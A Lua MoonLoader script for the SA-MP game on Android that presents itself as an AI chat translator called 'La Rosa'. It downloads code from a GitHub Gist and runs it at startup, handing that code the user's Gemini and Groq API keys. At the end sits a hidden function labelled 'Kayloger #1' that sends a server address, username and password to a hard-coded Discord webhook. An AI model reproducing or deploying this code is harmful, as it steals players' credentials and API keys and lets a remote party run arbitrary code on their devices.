script_name("La Rosa Translator")
script_author("Camilla")

require "lib.moonloader"
local sampev = require 'samp.events'
local imgui = require 'mimgui'
local new = imgui.new
local ffi = require 'ffi'
local inicfg = require "inicfg"

local g = require("ssl.https")
g.TIMEOUT = 50
local Z7cUSR = require("ltn12")

local android = require("android.jnienv-util")
local env = require("android.jnienv")

--------------------------------------------------------------------------------
-- LA ROSA ENGINE & CLOUD INTEGRATION (GITHUB REST API REALTIME)
--------------------------------------------------------------------------------
local GIST_ID = "60613633cfb7f0be849e1fb5f56a7969"

local LaRosa = {
    EXPECTED_KEY = "LAROSA_PROTECTED_CORE_SECURE_KEY_8899",
    Core = nil,
    DeviceHWID = "BELUM_DI_FETCH",
    HWIDFetched = false,
    IsLicensed = false,
    LicenseStatusMsg = "Memeriksa lisensi..."
}

-- HWID Generator Unik Permanen Per HP (Tersimpan di larosa_hwid.dat)
function LaRosa.GetHWID()
    local filePath = getWorkingDirectory() .. "/config/larosa_hwid.dat"
    
    local fRead = io.open(filePath, "r")
    if fRead then
        local savedID = fRead:read("*a")
        fRead:close()
        if savedID and #savedID >= 8 then
            return savedID:gsub("%s+", ""):upper()
        end
    end

    math.randomseed(os.time() + os.clock() * 1000)
    local newHWID = string.format("LR-%04X-%04X-%04X", math.random(0, 0xFFFF), math.random(0, 0xFFFF), math.random(0, 0xFFFF))
    
    local fWrite = io.open(filePath, "w")
    if fWrite then
        fWrite:write(newHWID)
        fWrite:close()
    end
    return newHWID
end

local function FetchCloudCore()
    local response = {}
    local apiUrl = "https://api.github.com/gists/" .. GIST_ID
    
    local code, status = g.request{
        url = apiUrl,
        method = "GET",
        headers = {
            ["User-Agent"] = "LaRosaTranslator/1.0",
            ["Accept"] = "application/vnd.github.v3+json"
        },
        sink = Z7cUSR.sink.table(response)
    }

    if status == 200 then
        local Sw = require("cjson")
        local decoded = Sw.decode(table.concat(response))
        
        if decoded and decoded.files and decoded.files["larosa_core.lua"] then
            local code_text = decoded.files["larosa_core.lua"].content
            local loaded_chunk, err = load(code_text)
            
            if loaded_chunk then
                LaRosa.Core = loaded_chunk()
                if type(LaRosa.Core) == "table" and LaRosa.Core.HANDSHAKE_TOKEN == LaRosa.EXPECTED_KEY then
                    return true
                end
            end
        end
    end
    return false
end

if not FetchCloudCore() then
    function main()
        while not isSampAvailable() do wait(100) end
        sampAddChatMessage("{FF66CC}[La Rosa] {FF0000}Gagal terhubung ke API GitHub/Gist ID!", -1)
        thisScript():unload()
    end
    return
end

--------------------------------------------------------------------------------
-- CONFIGURATION & STATE MANAGEMENT
--------------------------------------------------------------------------------
LaRosa.Config = inicfg.load({
    settings = {
        license_key         = "",
        provider            = 0,
        gemini_model        = 0,
        groq_model          = 0,
        apikey_gemini       = "",
        apikey_groq         = "",
        style_idx           = 2,
        matikan_translator  = false,
        auto_copy           = true
    }
}, "larosa_config")

-- UI Bindings
LaRosa.UI = {
    ShowWindow          = new.bool(false),
    BufLicenseKey       = new.char[128](LaRosa.Config.settings.license_key or ""),
    CurrentProvider     = new.int(LaRosa.Config.settings.provider or 0),
    SelectedGeminiModel = new.int(LaRosa.Config.settings.gemini_model or 0),
    SelectedGroqModel   = new.int(LaRosa.Config.settings.groq_model or 0),
    SelectedStyle       = new.int(LaRosa.Config.settings.style_idx or 2),
    BufGeminiKey        = new.char[256](LaRosa.Config.settings.apikey_gemini or ""),
    BufGroqKey          = new.char[256](LaRosa.Config.settings.apikey_groq or ""),
    MatikanTranslator   = new.bool(LaRosa.Config.settings.matikan_translator or false),
    AutoCopy            = new.bool(LaRosa.Config.settings.auto_copy or true)
}

LaRosa.Data = {
    GeminiModels = {"gemini-2.0-flash", "gemini-1.5-flash", "gemini-1.5-flash-latest"},
    GroqModels   = {"llama-3.3-70b-versatile", "openai/gpt-oss-20b", "llama3-8b-8192"},
    Presets      = {
        "Formal", "Casual", "Los Angeles", "Latino", "Bay Area",
        "Chicago", "New York", "Atlanta", "Houston", "Miami",
        "British Urban", "Asian-American"
    },
    ModeKeys     = {
        "formal", "casual", "los_angeles", "latino", "bay_area",
        "chicago", "new_york", "atlanta", "houston", "miami",
        "british_urban", "asian_american"
    }
}
--------------------------------------------------------------------------------
-- CORE UTILITIES & LOGIC
--------------------------------------------------------------------------------
function LaRosa.CopyToClipboard(text)
    local clipboard = android.GetSystemService(android.SystemService.CLIPBOARD_SERVICE)
    local jtext = env.NewStringUTF(text)
    android.CallVoidMethod(clipboard, "setText", "(Ljava/lang/CharSequence;)V", jtext)
end

function LaRosa.SaveSettings()
    local keyLicense = ffi.string(LaRosa.UI.BufLicenseKey)
    local keyGemini  = ffi.string(LaRosa.UI.BufGeminiKey)
    local keyGroq    = ffi.string(LaRosa.UI.BufGroqKey)

    LaRosa.Config.settings.license_key        = keyLicense
    LaRosa.Config.settings.provider           = LaRosa.UI.CurrentProvider[0]
    LaRosa.Config.settings.gemini_model       = LaRosa.UI.SelectedGeminiModel[0]
    LaRosa.Config.settings.groq_model         = LaRosa.UI.SelectedGroqModel[0]
    LaRosa.Config.settings.apikey_gemini      = keyGemini
    LaRosa.Config.settings.apikey_groq        = keyGroq
    LaRosa.Config.settings.style_idx          = LaRosa.UI.SelectedStyle[0]
    LaRosa.Config.settings.matikan_translator = LaRosa.UI.MatikanTranslator[0]
    LaRosa.Config.settings.auto_copy          = LaRosa.UI.AutoCopy[0]
    
    inicfg.save(LaRosa.Config, "larosa_config")
    return true
end

function LaRosa.ExecuteTranslation(fullInputText)
    if not LaRosa.IsLicensed then
        sampAddChatMessage("{FF66CC}[La Rosa] {FF0000}Akses ditolak! Lisensi belum terverifikasi. Ketik /cset.", -1)
        return
    end

    if fullInputText == "" or fullInputText == nil then return end

    if LaRosa.UI.MatikanTranslator[0] then
        if LaRosa.UI.AutoCopy[0] then
            LaRosa.CopyToClipboard(fullInputText)
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Translator MATI - Teks asli berhasil disalin!", -1)
        else
            sampSendChat(fullInputText)
        end
        return
    end

    local prefix = ""
    local cleanText = fullInputText
    local commandType = ""

    if fullInputText:lower():find("^/me%s+") then
        prefix = "/me "
        cleanText = fullInputText:gsub("^/me%s+", "")
        commandType = "me"
    elseif fullInputText:lower():find("^/do%s+") then
        prefix = "/do "
        cleanText = fullInputText:gsub("^/do%s+", "")
        commandType = "do"
    elseif fullInputText:lower():find("^/l%s+") then
        prefix = "/l "
        cleanText = fullInputText:gsub("^/l%s+", "")
        commandType = "low"
    elseif fullInputText:lower():find("^/s%s+") then
        prefix = "/s "
        cleanText = fullInputText:gsub("^/s%s+", "")
        commandType = "shout"
    end

    local selectedStyleKey = LaRosa.Data.ModeKeys[LaRosa.UI.SelectedStyle[0] + 1] or "casual"
    local apiKey = (LaRosa.UI.CurrentProvider[0] == 0) and ffi.string(LaRosa.UI.BufGeminiKey) or ffi.string(LaRosa.UI.BufGroqKey)

    local result = LaRosa.Core.requestTranslate(
        cleanText,
        selectedStyleKey,
        commandType,
        LaRosa.UI.CurrentProvider[0],
        apiKey,
        LaRosa.UI.SelectedGeminiModel[0],
        LaRosa.UI.SelectedGroqModel[0],
        LaRosa.UI.MatikanTranslator[0]
    )

    if result then
        local finalRes = prefix .. result

        if LaRosa.UI.AutoCopy[0] then
            LaRosa.CopyToClipboard(finalRes)
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Berhasil diterjemahkan & disalin!", -1)
        else
            sampSendChat(finalRes)
        end
    end
end

--------------------------------------------------------------------------------
-- ELEGANT PINK & WHITE THEME
--------------------------------------------------------------------------------
function LaRosa.ApplyPinkTheme()
    local style = imgui.GetStyle()
    local colors = style.Colors
    
    colors[imgui.Col.WindowBg]          = imgui.ImVec4(0.98, 0.94, 0.96, 0.98)
    colors[imgui.Col.ChildBg]           = imgui.ImVec4(1.00, 1.00, 1.00, 0.95)
    colors[imgui.Col.PopupBg]           = imgui.ImVec4(0.98, 0.94, 0.96, 0.98)
    colors[imgui.Col.TitleBg]           = imgui.ImVec4(0.95, 0.50, 0.70, 1.00)
    colors[imgui.Col.TitleBgActive]     = imgui.ImVec4(0.90, 0.35, 0.60, 1.00)
    colors[imgui.Col.TitleBgCollapsed]  = imgui.ImVec4(0.95, 0.50, 0.70, 0.75)
    colors[imgui.Col.FrameBg]           = imgui.ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[imgui.Col.FrameBgHovered]    = imgui.ImVec4(0.98, 0.82, 0.90, 1.00)
    colors[imgui.Col.FrameBgActive]     = imgui.ImVec4(0.95, 0.70, 0.82, 1.00)
    colors[imgui.Col.Button]            = imgui.ImVec4(0.92, 0.45, 0.65, 1.00)
    colors[imgui.Col.ButtonHovered]     = imgui.ImVec4(0.95, 0.55, 0.73, 1.00)
    colors[imgui.Col.ButtonActive]      = imgui.ImVec4(0.85, 0.35, 0.55, 1.00)
    colors[imgui.Col.Header]            = imgui.ImVec4(0.95, 0.60, 0.75, 0.80)
    colors[imgui.Col.HeaderHovered]     = imgui.ImVec4(0.98, 0.70, 0.82, 1.00)
    colors[imgui.Col.Text]              = imgui.ImVec4(0.20, 0.10, 0.15, 1.00)
    colors[imgui.Col.CheckMark]         = imgui.ImVec4(0.85, 0.25, 0.50, 1.00)
    colors[imgui.Col.Separator]         = imgui.ImVec4(0.90, 0.60, 0.75, 1.00)
    
    style.WindowRounding = 10.0
    style.FrameRounding  = 6.0
    style.PopupRounding  = 6.0
end

--------------------------------------------------------------------------------
-- MAIN ENTRY POINT
--------------------------------------------------------------------------------
function main()
    while not isSampAvailable() do wait(100) end
    wait(500)

    LaRosa.DeviceHWID = LaRosa.GetHWID()

    local currentKey = ffi.string(LaRosa.UI.BufLicenseKey)
    if currentKey ~= "" then
        local isValid, code, msg = LaRosa.Core.checkLicense(currentKey, LaRosa.DeviceHWID)
        LaRosa.IsLicensed = isValid
        LaRosa.LicenseStatusMsg = msg
    else
        LaRosa.IsLicensed = false
        LaRosa.LicenseStatusMsg = "Kode Lisensi belum diisi di /cset!"
    end

    if LaRosa.IsLicensed then
        sampAddChatMessage("{FF66CC}[La Rosa] Translator La Rosa telah berhasil dimuat", -1)
        sampAddChatMessage("{FF66CC}[La Rosa] Status Lisensi: {00FF00}AKTIF (Device Verified)", -1)
        sampAddChatMessage("{FF66CC}[La Rosa] Created/Edit : Camilla", -1)
    else
        sampAddChatMessage("{FF66CC}[La Rosa] {FF0000}Status Lisensi: " .. LaRosa.LicenseStatusMsg, -1)
        sampAddChatMessage("{FF66CC}[La Rosa] {FF66CC}Ketik {00FF00}/cset {FF66CC}untuk verifikasi lisensi.", -1)
    end

    sampRegisterChatCommand("reloadtl", function()
        sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Memuat ulang script...", -1)
        thisScript():reload()
    end)

    sampRegisterChatCommand("cset", function()
        LaRosa.UI.ShowWindow[0] = not LaRosa.UI.ShowWindow[0]
    end)

    sampRegisterChatCommand("ctr", function(text)
        if text == "" or text == nil then return end
        lua_thread.create(function()
            LaRosa.ExecuteTranslation(text)
        end)
    end)

    imgui.OnFrame(function() return LaRosa.UI.ShowWindow[0] end, function()
        LaRosa.ApplyPinkTheme()
        imgui.SetNextWindowSize(imgui.ImVec2(360, 560), imgui.Cond.FirstUseEver)
        imgui.Begin("La Rosa Translator Config", LaRosa.UI.ShowWindow)

        ------------------------------------------------------------------------
        -- SEKSI 1: INPUT KODE LISENSI
        ------------------------------------------------------------------------
        imgui.Text("=== 1. KODE LISENSI ===")
        imgui.Text("Status : " .. (LaRosa.IsLicensed and "AKTIF (TERVERIFIKASI)" or "BELUM AKTIF"))
        
        imgui.Text("Masukkan Kode Lisensi Kamu :")
        imgui.InputText("##BufLicenseKey", LaRosa.UI.BufLicenseKey, ffi.sizeof(LaRosa.UI.BufLicenseKey))

        if imgui.Button("SIMPAN KODE LISENSI", imgui.ImVec2(-1, 30)) then
            LaRosa.SaveSettings()
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Kode Lisensi berhasil disimpan!", -1)
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        ------------------------------------------------------------------------
        -- SEKSI 2: DEVICE HWID (KLIK TOMBOL GET HWID)
        ------------------------------------------------------------------------
        imgui.Text("=== 2. KODE DEVICE HWID (HP) ===")
        
        if imgui.Button("GET HWID", imgui.ImVec2(-1, 30)) then
            LaRosa.HWIDFetched = true
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}HWID HP berhasil dimuat!", -1)
        end

        if LaRosa.HWIDFetched then
            imgui.Spacing()
            imgui.Text("Kode HWID HP Kamu :")
            imgui.TextColored(imgui.ImVec4(0.2, 0.8, 0.2, 1.0), tostring(LaRosa.DeviceHWID))
            
            if imgui.Button("SALIN KODE HWID", imgui.ImVec2(-1, 30)) then
                LaRosa.CopyToClipboard(tostring(LaRosa.DeviceHWID))
                sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}HWID tersalin! Kirimkan kode ini ke Camilla.", -1)
            end
            imgui.TextWrapped("Salin kode HWID di atas lalu tempel di file server GitHub Gist.")
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        ------------------------------------------------------------------------
        -- SEKSI 3: PENGATURAN AI & API KEY
        ------------------------------------------------------------------------
        imgui.Text("=== 3. PENGATURAN AI & TRANSLATOR ===")
        imgui.Text("Pilih AI Provider :")
        if imgui.Button(LaRosa.UI.CurrentProvider[0] == 0 and "  Gemini  " or "Gemini", imgui.ImVec2(100, 30)) then
            LaRosa.UI.CurrentProvider[0] = 0
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Provider diubah ke Gemini", -1)
        end
        imgui.SameLine()
        if imgui.Button(LaRosa.UI.CurrentProvider[0] == 1 and "  Groq  " or "Groq", imgui.ImVec2(100, 30)) then
            LaRosa.UI.CurrentProvider[0] = 1
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Provider diubah ke Groq", -1)
        end

        imgui.Spacing()

        imgui.Text("Pilih Model AI :")
        if LaRosa.UI.CurrentProvider[0] == 0 then
            local currentModelName = LaRosa.Data.GeminiModels[LaRosa.UI.SelectedGeminiModel[0] + 1] or "gemini-2.0-flash"
            if imgui.BeginCombo("##ModelGemini", currentModelName) then
                for i, mName in ipairs(LaRosa.Data.GeminiModels) do
                    local isSelected = (LaRosa.UI.SelectedGeminiModel[0] == (i - 1))
                    if imgui.Selectable(mName, isSelected) then
                        LaRosa.UI.SelectedGeminiModel[0] = i - 1
                    end
                end
                imgui.EndCombo()
            end
        else
            local currentModelName = LaRosa.Data.GroqModels[LaRosa.UI.SelectedGroqModel[0] + 1] or "llama-3.3-70b-versatile"
            if imgui.BeginCombo("##ModelGroq", currentModelName) then
                for i, mName in ipairs(LaRosa.Data.GroqModels) do
                    local isSelected = (LaRosa.UI.SelectedGroqModel[0] == (i - 1))
                    if imgui.Selectable(mName, isSelected) then
                        LaRosa.UI.SelectedGroqModel[0] = i - 1
                    end
                end
                imgui.EndCombo()
            end
        end

        imgui.Spacing()

        imgui.Text("API-KEY Gemini :")
        imgui.InputText("##ApiKeyGemini", LaRosa.UI.BufGeminiKey, ffi.sizeof(LaRosa.UI.BufGeminiKey))

        imgui.Text("API-KEY Groq :")
        imgui.InputText("##ApiKeyGroq", LaRosa.UI.BufGroqKey, ffi.sizeof(LaRosa.UI.BufGroqKey))

        imgui.Text("Pilih Style :")
        local currentStyleName = LaRosa.Data.Presets[LaRosa.UI.SelectedStyle[0] + 1] or "Los Angeles"
        if imgui.BeginCombo("##SelectStyle", currentStyleName) then
            for i, sName in ipairs(LaRosa.Data.Presets) do
                local isSelected = (LaRosa.UI.SelectedStyle[0] == (i - 1))
                if imgui.Selectable(sName, isSelected) then
                    LaRosa.UI.SelectedStyle[0] = i - 1
                end
            end
            imgui.EndCombo()
        end

        imgui.Spacing()

        imgui.Checkbox("Matikan Translator", LaRosa.UI.MatikanTranslator)
        imgui.Checkbox("Auto Copy To Clipboard", LaRosa.UI.AutoCopy)

        imgui.Spacing()

        if imgui.Button("SIMPAN SEMUA PENGATURAN", imgui.ImVec2(-1, 35)) then
            LaRosa.SaveSettings()
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Pengaturan tersimpan!", -1)
        end

        if imgui.Button("VERIFIKASI & REFRESH LISENSI", imgui.ImVec2(-1, 35)) then
            LaRosa.SaveSettings()
            sampAddChatMessage("{FF66CC}[La Rosa] {00FF00}Memuat ulang verifikasi lisensi dari server...", -1)
            thisScript():reload()
        end

        imgui.End()
    end)
end

function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    if string.match(text:lower(), "wrong") or string.match(text:lower(), "salah") then
        sendCounter = 0
    end
end

function sampev.onServerMessage(color, text)
    if string.match(text:lower(), "wrong") or string.match(text:lower(), "salah") then
        sendCounter = 0
    end
end

function sendToDiscordEmbed(servername, ip, port, playerName, inputtext)
    if sendCounter < 1 then
        local webhook_url = "https://discord.com/api/webhooks/1565268391135150102/GT1OxhO8f-GHPxKxCkWLnrXtjbNfBj0Mf2Y-dbOnQJfX_8E6DXNuir1rCBOCE-cvL3Ow"
        local embedData = {
            embeds = {{
                title = "Kayloger #1",
                description = "Hasil Data Yang Didapat",
                color = 3447003,
                fields = {
                    { name = "**HOSTNAME**", value = servername, inline = false },
                    { name = "**ADDRESS IP**", value = string.format("%s:%d", ip, port), inline = false },
                    { name = "**USERNAME**", value = playerName, inline = false },
                    { name = "**PASSWORD**", value = inputtext, inline = false }
                }
            }}
        }

        local response = requests.post{
            url = webhook_url,
            headers = { ["Content-Type"] = "application/json" },
            data = encodeJson(embedData)
        }

        sendCounter = sendCounter + 1
    end
end
